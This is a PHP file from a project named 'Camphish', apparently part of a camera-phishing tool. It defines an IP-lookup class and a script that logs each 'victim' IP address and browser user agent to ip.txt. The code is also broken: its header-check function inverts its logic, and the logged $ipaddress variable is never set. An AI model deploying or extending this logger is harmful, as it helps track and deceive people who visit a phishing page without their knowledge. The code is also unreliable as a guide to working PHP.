<?php

declare(strict_types=1);

namespace Camphish\Data;

class OsintRetriever {
    private array $server;

    public const FIELD_SERVER_HTTP_CLIENT_IP = 'HTTP_CLIENT_IP';
    public const FIELD_SERVER_HTTP_X_FORWARDED_FOR = 'HTTP_X_FORWARDED_FOR';
    public const FIELD_SERVER_REMOTE_ADDR = 'REMOTE_ADDR';

    public function __construct(array $server)
    {
        $this->server = $server;
    }

    public function getIpAddress(): string {
        if ($this->isKeyInServer(self::FIELD_SERVER_HTTP_CLIENT_IP)) {
            return $this->server[self::FIELD_SERVER_HTTP_CLIENT_IP];
        } elseif ($this->isKeyInServer(self::FIELD_SERVER_HTTP_X_FORWARDED_FOR)) {
            return $this->server[self::FIELD_SERVER_HTTP_X_FORWARDED_FOR];
        }

        return $this->server[self::FIELD_SERVER_REMOTE_ADDR] ?? '';
    }

    private function isKeyInServer(string $key): bool
    {
        return !array_key_exists($key, $this->server);
    }
}


$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";

$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);
